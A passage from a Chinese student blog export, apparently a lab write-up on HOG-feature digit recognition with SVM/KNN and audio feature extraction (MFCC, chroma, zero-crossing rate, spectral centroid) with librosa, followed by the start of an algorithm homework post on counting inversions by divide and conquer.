labels_test)</span><br><span class="line">    cv.imshow(<span class="string">'SVM test'</span>, vis)</span><br><span class="line">    print(<span class="string">'saving SVM as "digits_svm.dat"...'</span>)</span><br><span class="line">    model.save(<span class="string">'digits_svm.dat'</span>)</span><br><span class="line"></span><br><span class="line">    cv.waitKey(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>训练结果如下：</strong></p>
<p>其中，白色的数字为分类识别成功，红色的为识别错误</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504181130518.png" alt="image-20200504181130518"></p>
<h2 id="1-5-HOG特征，自找数据集进行测试"><a href="#1-5-HOG特征，自找数据集进行测试" class="headerlink" title="1.5 HOG特征，自找数据集进行测试"></a>1.5 HOG特征，自找数据集进行测试</h2><p>这里我选择了<code>mnist</code>的图、以及word做的一些图混合来进行测试：</p>
<p><code>mnist</code>的图像大小都是<code>28 * 28</code>，word做的也不是<code>20*20</code>，我们用仿射变换来进行缩小为 <code>20 * 20</code></p>
<p>数据集，每一种数字有6个，总共有6 * 10=60张图：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504192849951.png" alt="image-20200504192849951"></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504191505663.png" alt="image-20200504191505663"></p>
<p>其中有个复杂的点，数据结构的问题：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># resp = model.predict(samples)</span></span><br><span class="line"><span class="comment">#这里加个[1].flatten()是因为读出的模型predict的datatype要转化为nparray</span></span><br><span class="line">resp=model.predict(samples)[<span class="number">1</span>].flatten()</span><br></pre></td></tr></table></figure>



<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.linalg <span class="keyword">import</span> norm</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> clock, mosaic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SZ = <span class="number">20</span> <span class="comment"># size of each digit is SZ x SZ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 纠正图像倾斜</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deskew</span><span class="params">(img)</span>:</span></span><br><span class="line">    m = cv.moments(img)</span><br><span class="line">    <span class="keyword">if</span> abs(m[<span class="string">'mu02'</span>]) &lt; <span class="number">1e-2</span>:</span><br><span class="line">        <span class="keyword">return</span> img.copy()</span><br><span class="line">    skew = m[<span class="string">'mu11'</span>]/m[<span class="string">'mu02'</span>]</span><br><span class="line">    M = np.float32([[<span class="number">1</span>, skew, <span class="number">-0.5</span>*SZ*skew], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]])</span><br><span class="line">    img = cv.warpAffine(img, M, (SZ, SZ), flags=cv.WARP_INVERSE_MAP | cv.INTER_LINEAR)</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="comment">#hog特征计算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_hog</span><span class="params">(digits)</span>:</span></span><br><span class="line">    samples = []</span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> digits:</span><br><span class="line">        gx = cv.Sobel(img, cv.CV_32F, <span class="number">1</span>, <span class="number">0</span>)  <span class="comment">#sobel算子 边缘检测 一阶差分滤波器</span></span><br><span class="line">        gy = cv.Sobel(img, cv.CV_32F, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        mag, ang = cv.cartToPolar(gx, gy)  <span class="comment">#极坐标变换 （模 角度）</span></span><br><span class="line">        bin_n = <span class="number">16</span>  <span class="comment">#区间数</span></span><br><span class="line">        bin = np.int32(bin_n*ang/(<span class="number">2</span>*np.pi))</span><br><span class="line">        bin_cells = bin[:<span class="number">10</span>,:<span class="number">10</span>], bin[<span class="number">10</span>:,:<span class="number">10</span>], bin[:<span class="number">10</span>,<span class="number">10</span>:], bin[<span class="number">10</span>:,<span class="number">10</span>:]</span><br><span class="line">        mag_cells = mag[:<span class="number">10</span>,:<span class="number">10</span>], mag[<span class="number">10</span>:,:<span class="number">10</span>], mag[:<span class="number">10</span>,<span class="number">10</span>:], mag[<span class="number">10</span>:,<span class="number">10</span>:]</span><br><span class="line">        hists = [np.bincount(b.ravel(), m.ravel(), bin_n) <span class="keyword">for</span> b, m <span class="keyword">in</span> zip(bin_cells, mag_cells)]    <span class="comment">#统计梯度直方图</span></span><br><span class="line">        hist = np.hstack(hists)</span><br><span class="line">        <span class="comment"># transform to Hellinger kernel  to quantify the similarity of two probability distributions</span></span><br><span class="line">        eps = <span class="number">1e-7</span></span><br><span class="line">        hist /= hist.sum() + eps</span><br><span class="line">        hist = np.sqrt(hist)</span><br><span class="line">        hist /= norm(hist) + eps</span><br><span class="line"></span><br><span class="line">        samples.append(hist)</span><br><span class="line">    <span class="keyword">return</span> np.float32(samples)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#评估函数，基本没改</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evaluate_model_2</span><span class="params">(model, digits, samples, labels)</span>:</span></span><br><span class="line">    <span class="comment"># resp = model.predict(samples)</span></span><br><span class="line">    <span class="comment">#这里加个[1].flatten()是因为读出的模型predict的datatype要转化为nparray</span></span><br><span class="line">    resp=model.predict(samples)[<span class="number">1</span>].flatten()</span><br><span class="line">    print(labels)</span><br><span class="line">    print(resp)</span><br><span class="line">    err = (labels != resp).mean()</span><br><span class="line">    print(<span class="string">'error: %.2f %%'</span> % (err*<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">    confusion = np.zeros((<span class="number">10</span>, <span class="number">10</span>), np.int32)</span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(labels, resp):</span><br><span class="line">        confusion[i, int(j)] += <span class="number">1</span></span><br><span class="line">    print(<span class="string">'confusion matrix:'</span>)</span><br><span class="line">    print(confusion)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    vis = []</span><br><span class="line">    <span class="keyword">for</span> img, flag <span class="keyword">in</span> zip(digits, resp == labels):</span><br><span class="line">        img = cv.cvtColor(img, cv.COLOR_GRAY2BGR) <span class="comment">#RGB显示？</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            img[...,:<span class="number">2</span>] = <span class="number">0</span> <span class="comment">#变红</span></span><br><span class="line">        vis.append(img)</span><br><span class="line">        <span class="comment"># 以25为一行</span></span><br><span class="line">    <span class="keyword">return</span> vis</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取mnist测试数据集</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_mnist</span><span class="params">()</span>:</span></span><br><span class="line">    path = <span class="string">"mnist"</span>  <span class="comment"># 文件夹目录</span></span><br><span class="line">    files = os.listdir(path)  <span class="comment"># 得到文件夹下的所有文件名称</span></span><br><span class="line">    s = <span class="string">""</span> <span class="comment">#全部文件名字符串</span></span><br><span class="line">    digits_img=[] <span class="comment">#图片数组</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">            s=s+file</span><br><span class="line">            print(<span class="string">'loading "%s" ...'</span> % file)<span class="comment">#加载某个文件</span></span><br><span class="line">            img = cv.imread(<span class="string">"mnist//"</span>+file, <span class="number">0</span>)<span class="comment">#读取图片</span></span><br><span class="line">            <span class="comment">#resize为20*20</span></span><br><span class="line">            img = cv.resize(img, (<span class="number">20</span>, <span class="number">20</span>), interpolation=cv.INTER_AREA)</span><br><span class="line">            digits_img.append(img)</span><br><span class="line">    <span class="comment"># 改为np数组</span></span><br><span class="line">    digits_img = np.array(digits_img)</span><br><span class="line">    <span class="comment"># lable数组</span></span><br><span class="line">    labels = np.repeat(np.arange(<span class="number">10</span>), len(digits_img) / <span class="number">10</span>)</span><br><span class="line">    print(s)  <span class="comment"># 打印读取的文件名</span></span><br><span class="line">    <span class="keyword">return</span> digits_img,labels</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试mnist数据集</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_mnist</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#加载数据集</span></span><br><span class="line">    digits_img,labels=read_mnist()</span><br><span class="line">    <span class="comment"># 纠正图片倾斜</span></span><br><span class="line">    digits2 = list(map(deskew, digits_img))</span><br><span class="line">    <span class="comment"># 计算hog特征</span></span><br><span class="line">    samples = preprocess_hog(digits2)   </span><br><span class="line">    <span class="comment">#展示test数据集</span></span><br><span class="line">    cv.imshow(<span class="string">'test set'</span>, mosaic(<span class="number">16</span>, digits_img))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#SVM模型分类</span></span><br><span class="line">    model=cv.ml.SVM_load(<span class="string">'SVM.dat'</span>)</span><br><span class="line">    vis = evaluate_model_2(model, digits2, samples, labels)</span><br><span class="line">    cv.imshow(<span class="string">'SVM test'</span>, mosaic(<span class="number">16</span>, vis))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#KNN模型分类</span></span><br><span class="line">    model=cv.ml.KNearest_load(<span class="string">'KNearest.dat'</span>)</span><br><span class="line">    vis = evaluate_model_2(model, digits2, samples, labels)</span><br><span class="line">    cv.imshow(<span class="string">'KNN test'</span>, mosaic(<span class="number">16</span>, vis))</span><br><span class="line"></span><br><span class="line">    cv.waitKey(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test_mnist()</span><br></pre></td></tr></table></figure>

<p><strong>结果：</strong></p>
<p>可以看到，OCR效果还是不错的</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504191549805.png" alt="image-20200504191549805"></p>
<h1 id="2、音频实验"><a href="#2、音频实验" class="headerlink" title="2、音频实验"></a>2、音频实验</h1><h2 id="2-1-背景介绍"><a href="#2-1-背景介绍" class="headerlink" title="2.1 背景介绍"></a>2.1 背景介绍</h2><p>本节实验课，实践音频的相关操作和库，以及一些基本特征的提取。</p>
<p>使用了实验自带的音频</p>
<p><audio id="audio" controls preload="none"> <source id="mp3" src="2020-05-03-information-security-exp-3/1.wav"> </audio></p>
<p>第一个实验（读取音频信息）用到的库：</p>
<blockquote>
<p>音频库：wave 库 <em><a href="https://docs.python.org/3/library/wave.html" target="_blank" rel="noopener">https://docs.python.org/3/library/wave.html</a></em> </p>
<p>绘图库：pylab库，这是 Matplotlib 和Ipython提供的一个模块，提供了类似Matlab的语法</p>
<p>Matplotlib是一个Python的图形框架，类似于MATLAB，同时还可以使用内嵌的latex引擎绘制的数学公式。</p>
<p>LibROSA是python用于音乐、音频分析的一个工具包。官方文档：<a href="http://librosa.github.io/librosa/" target="_blank" rel="noopener">http://librosa.github.io/librosa/</a></p>
</blockquote>
<p>第二个实验（读取音频特征）用到的库：</p>
<blockquote>
<p>安装LibROSA ：</p>
<p>windows命令行下pip install librosa</p>
<p>或anaconda命令行下conda install -c conda-forge librosa</p>
<p>LibROSA需要ffmpeg支持（用于音频和视频多种格式的录影、转换、流功能）</p>
<p>安装ffmpeg：</p>
<p>ffmpeg下载<a href="https://www.ffmpeg.org/download.html" target="_blank" rel="noopener">https://www.ffmpeg.org/download.html</a></p>
<p>配置环境向量<a href="http://alleni123.iteye.com/blog/2028433" target="_blank" rel="noopener">http://alleni123.iteye.com/blog/2028433</a></p>
</blockquote>
<h2 id="2-2-使用wave读取音频文件的信息"><a href="#2-2-使用wave读取音频文件的信息" class="headerlink" title="2.2 使用wave读取音频文件的信息"></a>2.2 使用wave读取音频文件的信息</h2><ul>
<li><strong>采样率</strong><br>外界的声音都是模拟信号，在数字设备中A/D转化成为了由0、1表示的数字信号后被储存下来。数字信号都是离散的，所以采样率是指一秒钟采样的次数，采样率越高，还原的声音也就越真实。由于人耳听觉范围是20Hz~20kHz，根据香农采样定理(也叫奈奎斯特采样定理)，理论上来说采样率大于40kHz的音频格式都可以称之为<strong>无损格式</strong>。</li>
<li>*<em>位深度 *</em><br>若要尽可能精确地还原声音，只有高采样率是不够的。描述一个采样点，横轴(时间)代表采样率，纵轴(幅度)代表位深度。</li>
<li><strong>码率</strong><br>在无损无压缩格式中(如.wav)，码率=采样率x位深度x声道数。在有损压缩中(如.mp3)码率便不等于这个公式了，因为原始信息已经被破坏。</li>
<li><strong>奈奎斯特采样定律</strong>：在进行模拟/数字信号的转换过程中，当采样频率fs.max大于信号中最高频率fmax的2倍时(fs.max&gt;2fmax)，采样之后的数字信号完整地保留了原始信号中的信息。</li>
<li><strong>人耳听音频率范围</strong>： 20Hz～20kHz标准格式化的WAV文件和CD格式一样，采样频率为44.1K。</li>
<li><strong>无损编码</strong>： 能够由编码后的数据完全无误地恢复原始信号采样值。常见的无损编码格式：APE、FLAC。</li>
<li><strong>有损编码</strong>：  根据人耳对不同频率的声音感知敏感度不同，在压缩过程中损失一部分音质以换取更高的压缩比，由于编码过程中有信息的损失，无法完全恢复原始信号。</li>
</ul>
<p>代码如下，说明已在代码中详细注释标出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> pylab <span class="keyword">as</span> pl</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">f = wave.open(<span class="string">r"1.wav"</span>,<span class="string">"rb"</span>)</span><br><span class="line"><span class="comment"># 读取格式信息</span></span><br><span class="line">params = f.getparams()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取wav文件信息（依次为声道数、位深度、采样频率、采样点数）</span></span><br><span class="line">nchannels, sampwidth, framerate, nframes = params[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">"声道数："</span>,nchannels)</span><br><span class="line">print(<span class="string">"位深度："</span>,sampwidth)</span><br><span class="line">print(<span class="string">"采样频率："</span>,framerate)</span><br><span class="line">print(<span class="string">"采样点数："</span>,nframes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取波形数据</span></span><br><span class="line">str_data = f.readframes(nframes)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment">#将波形数据转换为数组</span></span><br><span class="line">wave_data = np.fromstring(str_data, dtype=np.short)</span><br><span class="line"><span class="comment">#该文件为双声道，数组列数为2</span></span><br><span class="line">wave_data.shape = <span class="number">-1</span>, <span class="number">2</span></span><br><span class="line">wave_data = wave_data.T</span><br><span class="line"><span class="comment">#时长为总点数/频率</span></span><br><span class="line">time = np.arange(<span class="number">0</span>, nframes) * (<span class="number">1.0</span> / framerate)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制波形</span></span><br><span class="line">pl.subplot(<span class="number">211</span>)</span><br><span class="line"><span class="comment">#声道1（左声道），蓝色</span></span><br><span class="line">pl.plot(time, wave_data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">pl.subplot(<span class="number">212</span>)</span><br><span class="line"><span class="comment">#声道2（右声道）,绿色</span></span><br><span class="line">pl.plot(time, wave_data[<span class="number">1</span>], c=<span class="string">"g"</span>)</span><br><span class="line"><span class="comment">#横轴为时间、纵轴为幅度的量化值</span></span><br><span class="line">pl.xlabel(<span class="string">"time (seconds)"</span>)</span><br><span class="line">pl.show()</span><br></pre></td></tr></table></figure>

<p>音频基本信息如下所示：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504152416006.png" alt="image-20200504152416006"></p>
<p>音频波形图：</p>
<p>蓝色部分为声道1（左声道），绿色部分为声道2（右声道）横轴为时间、纵轴为幅度的量化值：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504152437022.png" alt="image-20200504152437022"></p>
<h2 id="2-3-使用LibROSA分别计算音频的MFCC和Chroma特征"><a href="#2-3-使用LibROSA分别计算音频的MFCC和Chroma特征" class="headerlink" title="2.3 使用LibROSA分别计算音频的MFCC和Chroma特征"></a>2.3 使用LibROSA分别计算音频的MFCC和Chroma特征</h2><p>每个音频信号都包含许多特征。但是，我们必须提取与我们试图解决的问题相关的特征。提取要使用它们进行分析的特征的过程称为特征提取，让我们详细研究一些特征。</p>
<p><strong>音频特征基础：</strong></p>
<p>谐波、冲击源分离（Harmonic Percussive Source Separation, HPSS）</p>
<p>一般而言，音乐信号在频谱图通常呈面两种形式分布，一种是沿时间轴连续平滑分布，另一种是沿频率轴连续平滑分布，通常将这两种分布的音源分别称作<strong>谐波源</strong>和<strong>冲击源</strong>。乐器可大致分为管弦乐器和打击乐器。管弦乐器产生的音源一般舒缓，音与音之间连续衔接，且频谱图上表现为平滑的包络，常见的管弦乐器有笛子、筝、小提琴、钢琴（钢琴虽不是严格意义上的管弦乐器，但其音源的频谱具有管弦乐音源的特征，因此这里将其归为一类）等。与之相反，打击乐器产生的音源一般有强烈的节奏感，音与音之间有较大的跨度在频谱图上表现为垂直包络，常见的打击乐器有鼓、木琴、小军鼓、锣等。因此在频谱图上，将管弦乐所产生的音源通常称之为谐波源，打击乐产生的音源通常称之为冲击源。谐波源通常包含固定音调，能在频谱上形成一系列平滑的瞬时包络，因此在时间轴方向上是平滑连续的，在频率轴方向上间断的；反之，冲击源一般集中在较短时间内，在频谱上形成一系列垂直的宽带谱包络，因此在时间轴方向上是间断的，在频率轴方向上是平滑连续的。</p>
<p><strong>在计算音频特征时，会根据这两种信号的不同特点，进行分离后分别进行特征计算。比如chroma特征就只使用了谐波源作为源数据</strong></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504154037385.png" alt="image-20200504154037385"></p>
<p><strong>音频特征：</strong></p>
<ul>
<li><p>MFCC(Mel-frequency cepstral coefficients)</p>
<p>梅尔频率倒谱系数。梅尔频率是基于人耳听觉特性提出来的， 它与Hz频率成非线性对应关系。</p>
<p>当频率在1000Hz以下时，人耳的听觉能力与声音频率呈线性增长，当频率在1000Hz以上时，与声音的频率呈对数分布。梅尔频率倒谱系数(MFCC)则是利用它们之间的这种关系，计算得到的Hz频谱特征。主要用于语音数据特征提取和降低运算维度。</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504153802954.png" alt="image-20200504153802954"></p>
</li>
<li><p>Chroma色度特征是色度向量（Chroma Vector）和色度图谱（Chromagram）的统称。色度向量是一个含有12个元素的向量，这些元素分别代表一段时间（如1帧）内12个音级中的能量，不同八度的同一音级能量累加，色度图谱则是色度向量的序列。色度特征的计算，参考：Automatic Chord Estimation from Audio: A R</p>
<p>eview of the State of the Art，过程如下图：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504153901633.png" alt="image-20200504153901633"></p>
</li>
</ul>
<p><strong>提取MFCC和Chroma</strong></p>
<p>提取MFCC和Chroma的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># Feature extraction example</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> librosa</span><br><span class="line"><span class="keyword">import</span> librosa.display</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment">#加载音频</span></span><br><span class="line"><span class="comment"># Load the example clip</span></span><br><span class="line">y, sr = librosa.load(<span class="string">"1.wav"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the hop length; at 22050 Hz, 512 samples ~= 23ms</span></span><br><span class="line">hop_length = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#时序y被分为信号的谐波和冲击两个时序，都与y有着相同的形状和时间长度。</span></span><br><span class="line"><span class="comment">#划分的意义：首先， percussive能够更好地表示节奏信息，意味着它能提供更稳定地节拍跟踪结果。</span></span><br><span class="line"><span class="comment">#其次， percussive在所有频带上都会贡献能量,会污染声调特征chroma，所以在计算chroma时会把percussive去掉。</span></span><br><span class="line"><span class="comment"># Separate harmonics and percussives into two waveforms</span></span><br><span class="line">y_harmonic, y_percussive = librosa.effects.hpss(y) <span class="comment">#频域内的谐波冲击波分离</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#冲击信号计算节拍</span></span><br><span class="line"><span class="comment"># Beat track on the percussive signal</span></span><br><span class="line">Tempo, beat_frames = librosa.beat.beat_track(y=y_percussive,sr=sr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算MFCC特征</span></span><br><span class="line"><span class="comment"># Compute MFCC features from the raw signa</span></span><br><span class="line">mfcc = librosa.feature.mfcc(y=y, sr=sr, hop_length=hop_length, n_mfcc=<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算每帧之间MFCC的一阶差分</span></span><br><span class="line"><span class="comment"># And the first-order differences (delta features)</span></span><br><span class="line">mfcc_delta = librosa.feature.delta(mfcc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 叠加并同步MFCC特征</span></span><br><span class="line"><span class="comment"># Stack and synchronize between beat events</span></span><br><span class="line"><span class="comment"># This time, we’ll use the mean value (default) instead of median</span></span><br><span class="line">beat_mfcc_delta = librosa.util.sync(np.vstack([mfcc, mfcc_delta]),beat_frames)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用谐波计算色度特征</span></span><br><span class="line"><span class="comment"># Compute chroma features from the harmonic signa</span></span><br><span class="line">chromagram = librosa.feature.chroma_cqt(y=y_harmonic,sr=sr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#整合色度特征</span></span><br><span class="line"><span class="comment"># Aggregate chroma features between beat events</span></span><br><span class="line"><span class="comment"># We’ll use the median value of each feature between beat frames</span></span><br><span class="line">beat_chroma = librosa.util.sync(chromagram,beat_frames,aggregate=np.median)</span><br><span class="line"></span><br><span class="line"><span class="comment">#叠加所有特征</span></span><br><span class="line"><span class="comment"># Finally, stack all beat-synchronous features togethe</span></span><br><span class="line">beat_features = np.vstack([beat_chroma, beat_mfcc_delta])</span><br><span class="line"><span class="comment">#得到beat_features的维度为(12 + 13 + 13, # beat intervals)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#绘制mfcc特征图</span></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">librosa.display.specshow(mfcc, sr=sr, x_axis=<span class="string">'time'</span>)</span><br><span class="line">plt.title(<span class="string">'mfcc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#绘制chroma特征图</span></span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">librosa.display.specshow(chromagram, sr=sr,y_axis=<span class="string">'chroma'</span>, x_axis=<span class="string">'time'</span>, hop_length=hop_length, cmap=<span class="string">'coolwarm'</span>)</span><br><span class="line">plt.title(<span class="string">'chromagram'</span>)</span><br><span class="line"></span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>如下为我们的mfcc和chroma的特征图</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504155357411.png" alt="image-20200504155357411"></p>
<h2 id="2-4-提取过零率特征"><a href="#2-4-提取过零率特征" class="headerlink" title="2.4 提取过零率特征"></a>2.4 提取过零率特征</h2><p>过零率（zero crossing rate）是一个信号符号变化的比率，即，在每帧中，语音信号从正变为负或从负变为正的次数。 这个特征已在语音识别和音乐信息检索领域得到广泛使用，通常对类似金属、摇滚等高冲击性的声音的具有更高的价值。</p>
<p>该特征在语音识别和音乐信息检索中都被大量使用。对于像金属和岩石那样的高冲击声，它通常具有更高的值。让我们计算示例音频片段的过零率。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> librosa.display</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 加载信号</span></span><br><span class="line">x, sr = librosa.load(<span class="string">"1.wav"</span>)</span><br><span class="line"><span class="comment">#绘制信号波形图</span></span><br><span class="line"><span class="comment"># plt.figure(figsize=(14, 5))</span></span><br><span class="line"><span class="comment"># librosa.display.waveplot(x, sr=sr)</span></span><br><span class="line"><span class="comment"># 放大n0~n1区间，绘制过零点</span></span><br><span class="line">n0 = <span class="number">9000</span></span><br><span class="line">n1 = <span class="number">9100</span></span><br><span class="line">plt.figure(figsize=(<span class="number">14</span>, <span class="number">5</span>))</span><br><span class="line">plt.plot(x[n0:n1])</span><br><span class="line">plt.grid()</span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment">#计算在n0~n1区间的过零率数目</span></span><br><span class="line">zero_crossings = librosa.zero_crossings(x[n0:n1], pad=<span class="literal">False</span>)</span><br><span class="line">print(sum(zero_crossings))</span><br></pre></td></tr></table></figure>

<p>在这段区间（9000~9100）有11个过零点</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504160541818.png" alt="image-20200504160541818"></p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504160027498.png" alt="image-20200504160027498"></p>
<h2 id="2-5-提取光谱质心特征"><a href="#2-5-提取光谱质心特征" class="headerlink" title="2.5 提取光谱质心特征"></a>2.5 提取光谱质心特征</h2><p>光谱质心(Spectral Centroid)指示声音的“质心”位于何处，并按照声音的频率的加权平均值来加以计算。 假设现有两首歌曲，一首是蓝调歌曲，另一首是金属歌曲。现在，与同等长度的蓝调歌曲相比，金属歌曲在接近尾声位置的频率更高。所以蓝调歌曲的频谱质心会在频谱偏中间的位置，而金属歌曲的频谱质心则靠近频谱末端。</p>
<p>librosa.feature.spectral_centroid 计算信号中每帧的光谱质心：</p>
<p><img src="/2020/05/03/2020-05-03-information-security-exp-3/image-20200504160815181.png" alt="image-20200504160815181"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> librosa.display</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 加载信号</span></span><br><span class="line"><span class="keyword">import</span> sklearn</span><br><span class="line"></span><br><span class="line">x, sr = librosa.load(<span class="string">"1.wav"</span>)</span><br><span class="line"></span><br><span class="line">spectral_centroids = librosa.feature.spectral_centroid(x, sr=sr)[<span class="number">0</span>]</span><br><span class="line">print(spectral_centroids.shape)</span><br><span class="line"><span class="comment"># (2647,)</span></span><br><span class="line"><span class="comment">#计算可视化时间变量</span></span><br><span class="line"><span class="comment"># Computing the time variable for visualization</span></span><br><span class="line">frames = range(len(spectral_centroids))</span><br><span class="line">t = librosa.frames_to_time(frames)</span><br><span class="line"><span class="comment">#标准化光谱质心以进行可视化</span></span><br><span class="line"><span class="comment"># Normalising the spectral centroid for visualisation</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize</span><span class="params">(x, axis=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sklearn.preprocessing.minmax_scale(x, axis=axis)</span><br><span class="line"><span class="comment">#可视化光谱质心</span></span><br><span class="line"><span class="comment">#Plotting the Spectral Centroid along the waveform</span></span><br><span class="line">librosa.display.waveplot(x, sr=sr, alpha=<span class="number">0.4</span>)</span><br><span class="line">plt.plot(t, normalize(spectral_centroids), color=<span class="string">'r'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>参考资料：</p>
<p>LIBROSA处理音频信号   <a href="https://www.freesion.com/article/4795221829/" target="_blank" rel="noopener">https://www.freesion.com/article/4795221829/</a></p>
<h1 id="3、总结"><a href="#3、总结" class="headerlink" title="3、总结"></a>3、总结</h1><ul>
<li>这次实验挺有趣的，难度也适中。</li>
<li>大多数时候出错，都是api不熟悉导致的，多看多敲就好了。</li>
<li>图像处理部分的透视变化、numpy的熟悉、HOG特征的计算、KNN、SVM聚类的学习。音频部分对音频特征和参数的介绍等等，学到了很多东西。</li>
<li>但是，信息数据处理才是刚刚入了一点点门，还得继续努力才是。</li>
</ul>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-04-30-algorithm-homework-2</title>
    <url>/2020/04/30/2020-04-30-algorithm-homework-2/</url>
    <content><![CDATA[<h1 id="1-明显倒置问题——分治"><a href="#1-明显倒置问题——分治" class="headerlink" title="1.明显倒置问题——分治"></a>1.明显倒置问题——分治</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427220820331.png" alt="image-20200427220820331"></p>
<h2 id="1-1-描述算法思想"><a href="#1-1-描述算法思想" class="headerlink" title="1.1 描述算法思想"></a>1.1 描述算法思想</h2><p>我们可以再归并排序的基础上来计算明显倒置。</p>
<ul>
<li>分治：将一列数字平分为左右两列数字</li>
<li>治理：左右两列数字分别计算其明显倒置个数A、B</li>
<li>合并：计算左列右列（i在左列，j在右列）所含的明显倒置个数C，A+B+C即为明显倒置的总个数</li>
</ul>
